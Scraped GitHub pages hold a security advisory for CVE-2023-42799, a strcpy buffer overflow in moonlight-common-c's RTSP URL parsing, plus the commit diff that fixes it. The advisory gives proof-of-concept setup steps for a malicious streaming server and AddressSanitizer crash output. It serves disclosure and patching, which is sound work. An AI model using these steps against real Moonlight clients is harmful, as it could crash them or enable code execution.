=== Content from github.com_b60a038d_20250111_171951.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmoonlight-stream%2Fmoonlight-common-c%2Fsecurity%2Fadvisories%2FGHSA-r8cf-45f4-vf8m)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmoonlight-stream%2Fmoonlight-common-c%2Fsecurity%2Fadvisories%2FGHSA-r8cf-45f4-vf8m)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=moonlight-stream%2Fmoonlight-common-c)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[moonlight-stream](/moonlight-stream)
/
**[moonlight-common-c](/moonlight-stream/moonlight-common-c)**
Public

* [Notifications](/login?return_to=%2Fmoonlight-stream%2Fmoonlight-common-c) You must be signed in to change notification settings
* [Fork
  174](/login?return_to=%2Fmoonlight-stream%2Fmoonlight-common-c)
* [Star
   469](/login?return_to=%2Fmoonlight-stream%2Fmoonlight-common-c)

* [Code](/moonlight-stream/moonlight-common-c)
* [Issues
  14](/moonlight-stream/moonlight-common-c/issues)
* [Pull requests
  5](/moonlight-stream/moonlight-common-c/pulls)
* [Actions](/moonlight-stream/moonlight-common-c/actions)
* [Projects
  0](/moonlight-stream/moonlight-common-c/projects)
* [Security](/moonlight-stream/moonlight-common-c/security)
* [Insights](/moonlight-stream/moonlight-common-c/pulse)

Additional navigation options

* [Code](/moonlight-stream/moonlight-common-c)
* [Issues](/moonlight-stream/moonlight-common-c/issues)
* [Pull requests](/moonlight-stream/moonlight-common-c/pulls)
* [Actions](/moonlight-stream/moonlight-common-c/actions)
* [Projects](/moonlight-stream/moonlight-common-c/projects)
* [Security](/moonlight-stream/moonlight-common-c/security)
* [Insights](/moonlight-stream/moonlight-common-c/pulse)

# Buffer overflow due to use of `strcpy` in `parseUrlAddrFromRtspUrlString`

High

[cgutman](/cgutman)
published
GHSA-r8cf-45f4-vf8m
Dec 14, 2023

## Package

moonlight-common-c

## Affected versions

>= 0c0a51b10ecc5b3415ea78c21d96d679e2288f9

## Patched versions

>= 02b7742f4d19631024bd766bd2bb76715780004e

## Description

### Impact

A malicious game streaming server could exploit a buffer overflow vulnerability to crash a moonlight client, or achieve remote code execution (RCE) on the client (with insufficient exploit mitigations or if mitigations can be bypassed). The CVSS vulnerabililty severity score is based on the worst-case scenario of a client with no exploit mitigations.

This vulnerability takes place after the pairing process, so it requires the user to be tricked into pairing to a malicious host. It is not possible to perform using a MITM due to public key pinning that takes place during the pairing process.

### Summary

A buffer overflow was introduced in [this commit](https://github.com/moonlight-stream/moonlight-common-c/commit/50c0a51b10ecc5b3415ea78c21d96d679e2288f9) due to unmitigated usage of unsafe C functions and improper bounds checking.

### Details

A memory corruption exists within the `parseUrlAddrFromRtspUrlString` function in `RtspConnection.c`. The RTSP URL string received from the game streaming server is copied into `urlAddr`, which is a static buffer of length 48:

[moonlight-common-c/src/RtspConnection.c](https://github.com/moonlight-stream/moonlight-common-c/blob/2bb026c763fc18807d7e4a93f918054c488f84e1/src/RtspConnection.c#L704)

Line 704
in
[2bb026c](/moonlight-stream/moonlight-common-c/commit/2bb026c763fc18807d7e4a93f918054c488f84e1)

|  | strcpy(destination, rtspUrlScratchBuffer + prefixLen); |
| --- | --- |

The server-provided `rtspUrlScratchBuffer` contents may be of arbitrary length, so it can overflow `urlAddr` into the surrounding memory, allowing for a crash or RCE.

The vulnerable code path requires the client to have selected a video bitrate of at least 15 Mbps.

### Patch

The bug was addressed in [02b7742](https://github.com/moonlight-stream/moonlight-common-c/commit/02b7742f4d19631024bd766bd2bb76715780004e)

### Affected Moonlight Client Versions

Known affected clients are listed below for convenience. Not all clients may be vulnerable with the same severity due to differences in built-in exploit mitigations on each platform.

Affected client version ranges (inclusive):

* [Moonlight iOS/tvOS](https://github.com/moonlight-stream/moonlight-ios) - v8.4.0 to v8.5.0
* [Moonlight Android](https://github.com/moonlight-stream/moonlight-android) - v10.10 to v11.0
* [Moonlight Chrome](https://github.com/moonlight-stream/moonlight-chrome) - v0.10.22
* [Moonlight Embedded](https://github.com/moonlight-stream/moonlight-embedded) - v2.6.0
* [Moonlight Xbox](https://github.com/TheElixZammuto/moonlight-xbox) - v1.12.0 to v1.14.4.0
* [Moonlight TV](https://github.com/mariotaku/moonlight-tv) - v1.5.4 to v1.5.27
* [Moonlight Switch](https://github.com/XITRIX/Moonlight-Switch) - v0.13 to v0.13.3
* [Moonlight Vita](https://github.com/xyzz/vita-moonlight) - v0.9.2 to v0.9.3

There may be other third-party Moonlight clients and forks that were not investigated for vulnerability.

### PoC

A Python webserver can be used to simulate the gamestream server and serve the exploit: <https://github.com/k3an3/cve/moonlight-common-c/>

1. Extract the webserver to a clean directory:

```
tar xf exploit.tar.xz

```

2. Install needed dependencies (ideally within a Python virtual environment):

```
python3 -m pip install -r requirements.txt

```

3. Run the webserver, and a proxy to handle TLS connections (requires `ssl-cert` Debian package, or similar):

```
socat openssl-listen:47984,fork,reuseaddr,key=/etc/ssl/private/ssl-cert-snakeoil.key,cert=/etc/ssl/certs/ssl-cert-snakeoil.pem,verify=0 tcp:127.0.0.1:47989
python3 app.py

```

4. Create a `moonlight.conf` with the following contents:

```
address = <ADDRESS_OF_EXPLOIT_SERVER>
bitrate = 20000

```

5. Invoke `moonlight stream`:

```
moonlight -config path/to/moonlight.conf stream

```

6. The program should crash.

AddressSanitizer output:

```
$ ./moonlight stream
/home/keane/src/moonlight-embedded/src/config.c:125:20: runtime error: applying non-zero offset 1 to null pointer
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior /home/keane/src/moonlight-embedded/src/config.c:125:20 in
Failed to open device /dev/input/event7
Failed to open device /dev/input/event8
Failed to open device /dev/input/event2
Failed to open device /dev/input/event1
Failed to open device /dev/input/event3
Failed to open device /dev/input/event11
Failed to open device /dev/input/event12
Failed to open device /dev/input/event14
Failed to open device /dev/input/event15
Failed to open device /dev/input/event16
Failed to open device /dev/input/event17
Failed to open device /dev/input/event4
Failed to open device /dev/input/event5
Failed to open device /dev/input/event13
Failed to open device /dev/input/event0
Failed to open device /dev/input/event10
=================================================================
==3625494==ERROR: AddressSanitizer: global-buffer-overflow on address 0x7ff102ff27d0 at pc 0x55e3eee41167 bp 0x7ffc54296810 sp 0x7ffc54295fd8
WRITE of size 131073 at 0x7ff102ff27d0 thread T0
    #0 0x55e3eee41166 in __interceptor_strcpy (/home/keane/src/moonlight-embedded/build/moonlight+0xe3166) (BuildId: 86b3510cc7e8650dfd2c4bf59c233cc8c1add2ef)
    #1 0x7ff102eb85c6 in parseUrlAddrFromRtspUrlString /home/keane/src/moonlight-embedded/third_party/moonlight-common-c/src/RtspConnection.c:704:5
    #2 0x7ff102eacfdd in performRtspHandshake /home/keane/src/moonlight-embedded/third_party/moonlight-common-c/src/RtspConnection.c:795:51
    #3 0x7ff102e07c80 in LiStartConnection /home/keane/src/moonlight-embedded/third_party/moonlight-common-c/src/Connection.c:415:11
    #4 0x55e3eeeaf22b in stream /home/keane/src/moonlight-embedded/src/main.c:146:3
    #5 0x55e3eeeab35c in main /home/keane/src/moonlight-embedded/src/main.c:395:5
    #6 0x7ff1024456c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #7 0x7ff102445784 in __libc_start_main csu/../csu/libc-start.c:360:3
    #8 0x55e3eedd3b80 in _start (/home/keane/src/moonlight-embedded/build/moonlight+0x75b80) (BuildId: 86b3510cc7e8650dfd2c4bf59c233cc8c1add2ef)

0x7ff102ff27d0 is located 48 bytes to the left of global variable 'rtspTargetUrl' defined in '/home/keane/src/moonlight-embedded/third_party/moonlight-common-c/src/RtspConnection.c:9:13' (0x7ff102ff2800) of size 256
0x7ff102ff27d0 is located 0 bytes to the right of global variable 'urlAddr' defined in '/home/keane/src/moonlight-embedded/third_party/moonlight-common-c/src/RtspConnection.c:13:13' (0x7ff102ff27a0) of size 48
SUMMARY: AddressSanitizer: global-buffer-overflow (/home/keane/src/moonlight-embedded/build/moonlight+0xe3166) (BuildId: 86b3510cc7e8650dfd2c4bf59c233cc8c1add2ef) in __interceptor_strcpy
Shadow bytes around the buggy address:
  0x0ffea05f64a0: 00 00 00 00 f9 f9 f9 f9 04 f9 f9 f9 04 f9 f9 f9
  0x0ffea05f64b0: 00 00 f9 f9 01 f9 f9 f9 04 f9 f9 f9 04 f9 f9 f9
  0x0ffea05f64c0: 04 f9 f9 f9 00 00 00 00 00 00 f9 f9 f9 f9 f9 f9
  0x0ffea05f64d0: 00 00 00 00 00 00 f9 f9 f9 f9 f9 f9 00 f9 f9 f9
  0x0ffea05f64e0: 00 f9 f9 f9 01 f9 f9 f9 04 f9 f9 f9 01 f9 f9 f9
=>0x0ffea05f64f0: 00 f9 f9 f9 00 00 00 00 00 00[f9]f9 f9 f9 f9 f9
  0x0ffea05f6500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ffea05f6510: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ffea05f6520: f9 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9 00 f9 f9 f9
  0x0ffea05f6530: 00 f9 f9 f9 00 f9 f9 f9 00 00 00 00 00 00 00 00
  0x0ffea05f6540: 00 00 00 00 00 00 00 f9 f9 f9 f9 f9 04 f9 f9 f9
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
AddressSanitizer:DEADLYSIGNAL
=================================================================
==3625494==ERROR: AddressSanitizer: SEGV on unknown address 0x7ff10300b000 (pc 0x7ff102573013 bp 0x7ffc54296810 sp 0x7ffc54295fc8 T0)
==3625494==The signal is caused by a WRITE memory access.
    #0 0x7ff102573013 in __strcpy_avx2 string/../sysdeps/x86_64/multiarch/strcpy-avx2.S:226
    #1 0x55e3eee41198 in __interceptor_strcpy (/home/keane/src/moonlight-embedded/build/moonlight+0xe3198) (BuildId: 86b3510cc7e8650dfd2c4bf59c233cc8c1add2ef)
    #2 0x7ff102eb85c6 in parseUrlAddrFromRtspUrlString /home/keane/src/moonlight-embedded/third_party/moonlight-common-c/src/RtspConnection.c:704:5
    #3 0x7ff102eacfdd in performRtspHandshake /home/keane/src/moonlight-embedded/third_party/moonlight-common-c/src/RtspConnection.c:795:51
    #4 0x7ff102e07c80 in LiStartConnection /home/keane/src/moonlight-embedded/third_party/moonlight-common-c/src/Connection.c:415:11
    #5 0x55e3eeeaf22b in stream /home/keane/src/moonlight-embedded/src/main.c:146:3
    #6 0x55e3eeeab35c in main /home/keane/src/moonlight-embedded/src/main.c:395:5
    #7 0x7ff1024456c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #8 0x7ff102445784 in __libc_start_main csu/../csu/libc-start.c:360:3
    #9 0x55e3eedd3b80 in _start (/home/keane/src/moonlight-embedded/build/moonlight+0x75b80) (BuildId: 86b3510cc7e8650dfd2c4bf59c233cc8c1add2ef)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV string/../sysdeps/x86_64/multiarch/strcpy-avx2.S:226 in __strcpy_avx2
==3625494==ABORTING

```

### Severity

High

8.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

### CVE ID

CVE-2023-42799

### Weaknesses

[CWE-120](/advisories?query=cwe%3A120)

### Credits

* [![@k3an3](https://avatars.githubusercontent.com/u/2617725?s=40&v=4)](/k3an3)
  [k3an3](/k3an3)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_2b7a3430_20250111_171950.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmoonlight-stream%2Fmoonlight-common-c%2Fcommit%2F02b7742f4d19631024bd766bd2bb76715780004e)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmoonlight-stream%2Fmoonlight-common-c%2Fcommit%2F02b7742f4d19631024bd766bd2bb76715780004e)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=moonlight-stream%2Fmoonlight-common-c)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[moonlight-stream](/moonlight-stream)
/
**[moonlight-common-c](/moonlight-stream/moonlight-common-c)**
Public

* [Notifications](/login?return_to=%2Fmoonlight-stream%2Fmoonlight-common-c) You must be signed in to change notification settings
* [Fork
  174](/login?return_to=%2Fmoonlight-stream%2Fmoonlight-common-c)
* [Star
   469](/login?return_to=%2Fmoonlight-stream%2Fmoonlight-common-c)

* [Code](/moonlight-stream/moonlight-common-c)
* [Issues
  14](/moonlight-stream/moonlight-common-c/issues)
* [Pull requests
  5](/moonlight-stream/moonlight-common-c/pulls)
* [Actions](/moonlight-stream/moonlight-common-c/actions)
* [Projects
  0](/moonlight-stream/moonlight-common-c/projects)
* [Security](/moonlight-stream/moonlight-common-c/security)
* [Insights](/moonlight-stream/moonlight-common-c/pulse)

Additional navigation options

* [Code](/moonlight-stream/moonlight-common-c)
* [Issues](/moonlight-stream/moonlight-common-c/issues)
* [Pull requests](/moonlight-stream/moonlight-common-c/pulls)
* [Actions](/moonlight-stream/moonlight-common-c/actions)
* [Projects](/moonlight-stream/moonlight-common-c/projects)
* [Security](/moonlight-stream/moonlight-common-c/security)
* [Insights](/moonlight-stream/moonlight-common-c/pulse)

## Commit

[Permalink](/moonlight-stream/moonlight-common-c/commit/02b7742f4d19631024bd766bd2bb76715780004e)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix buffer overflow in parseUrlAddrFromRtspUrlString (CVE-2023-42799)

[Browse files](/moonlight-stream/moonlight-common-c/tree/02b7742f4d19631024bd766bd2bb76715780004e)
Browse the repository at this point in the history

* Loading branch information

[![@k3an3](https://avatars.githubusercontent.com/u/2617725?s=40&v=4)](/k3an3) [![@cgutman](https://avatars.githubusercontent.com/u/2695644?s=40&v=4)](/cgutman)

[k3an3](/moonlight-stream/moonlight-common-c/commits?author=k3an3 "View all commits by k3an3")
authored and
[cgutman](/moonlight-stream/moonlight-common-c/commits?author=cgutman "View all commits by cgutman")
committed
Oct 7, 2023

1 parent
[116267a](/moonlight-stream/moonlight-common-c/commit/116267a24569ec610f4c9efa1048541022981040)

commit 02b7742

Showing
**1 changed file**
with
**6 additions**
and
**5 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

11 changes: 6 additions & 5 deletions

11
[src/RtspConnection.c](#diff-8b678559c0bf2ad7ac3b7fd275a8138dd1e46c27d00ae881af423ad3629b4617 "src/RtspConnection.c")

Show comments

[View file](/moonlight-stream/moonlight-common-c/blob/02b7742f4d19631024bd766bd2bb76715780004e/src/RtspConnection.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -657,7 +657,7 @@ static int parseOpusConfigurations(PRTSP\_MESSAGE response) { |
|  |  | return 0; |
|  |  | } |
|  |  |  |
|  |  | static bool parseUrlAddrFromRtspUrlString(const char\* rtspUrlString, char\* destination) { |
|  |  | static bool parseUrlAddrFromRtspUrlString(const char\* rtspUrlString, char\* destination, size\_t destinationLength) { |
|  |  | char\* rtspUrlScratchBuffer; |
|  |  | char\* portSeparator; |
|  |  | char\* v6EscapeEndChar; |
| Expand Down  Expand Up | | @@ -701,7 +701,8 @@ static bool parseUrlAddrFromRtspUrlString(const char\* rtspUrlString, char\* desti |
|  |  | \*urlPathSeparator = 0; |
|  |  | } |
|  |  |  |
|  |  | strcpy(destination, rtspUrlScratchBuffer + prefixLen); |
|  |  | PltSafeStrcpy(destination, destinationLength, rtspUrlScratchBuffer + prefixLen); |
|  |  | destination[destinationLength - 1] = '\0'; |
|  |  |  |
|  |  | free(rtspUrlScratchBuffer); |
|  |  | return true; |
| Expand Down  Expand Up | | @@ -774,7 +775,7 @@ int performRtspHandshake(PSERVER\_INFORMATION serverInfo) { |
|  |  | (AudioCallbacks.capabilities & CAPABILITY\_SLOW\_OPUS\_DECODER) == 0 && |
|  |  | (StreamConfig.streamingRemotely != STREAM\_CFG\_REMOTE || CHANNEL\_COUNT\_FROM\_AUDIO\_CONFIGURATION(StreamConfig.audioConfiguration) <= 2)) { |
|  |  | // If we have an RTSP URL string and it was successfully parsed, use that string |
|  |  | if (serverInfo->rtspSessionUrl != NULL && parseUrlAddrFromRtspUrlString(serverInfo->rtspSessionUrl, urlAddr)) { |
|  |  | if (serverInfo->rtspSessionUrl != NULL && parseUrlAddrFromRtspUrlString(serverInfo->rtspSessionUrl, urlAddr, sizeof(urlAddr))) { |
|  |  | strcpy(rtspTargetUrl, serverInfo->rtspSessionUrl); |
|  |  | } |
|  |  | else { |
| Expand All | | @@ -784,12 +785,12 @@ int performRtspHandshake(PSERVER\_INFORMATION serverInfo) { |
|  |  | // audio since it only does that for local streaming normally. We can avoid this limitation, |
|  |  | // but only if the caller gave us the RTSP session URL that it received from the host during launch. |
|  |  | addrToUrlSafeString(&RemoteAddr, urlAddr, sizeof(urlAddr)); |
|  |  | sprintf(rtspTargetUrl, "rtsp%s://%s:%u", useEnet ? "ru" : "", urlAddr, RtspPortNumber); |
|  |  | snprintf(rtspTargetUrl, sizeof(rtspTargetUrl), "rtsp%s://%s:%u", useEnet ? "ru" : "", urlAddr, RtspPortNumber); |
|  |  | } |
|  |  | } |
|  |  | else { |
|  |  | PltSafeStrcpy(urlAddr, sizeof(urlAddr), "0.0.0.0"); |
|  |  | sprintf(rtspTargetUrl, "rtsp%s://%s:%u", useEnet ? "ru" : "", urlAddr, RtspPortNumber); |
|  |  | snprintf(rtspTargetUrl, sizeof(rtspTargetUrl), "rtsp%s://%s:%u", useEnet ? "ru" : "", urlAddr, RtspPortNumber); |
|  |  | } |
|  |  |  |
|  |  | switch (AppVersionQuad[0]) { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `02b7742`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmoonlight-stream%2Fmoonlight-common-c%2Fcommit%2F02b7742f4d19631024bd766bd2bb76715780004e) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_78b8162a_20250111_171951.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmoonlight-stream%2Fmoonlight-common-c%2Fcommit%2F50c0a51b10ecc5b3415ea78c21d96d679e2288f9)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmoonlight-stream%2Fmoonlight-common-c%2Fcommit%2F50c0a51b10ecc5b3415ea78c21d96d679e2288f9)

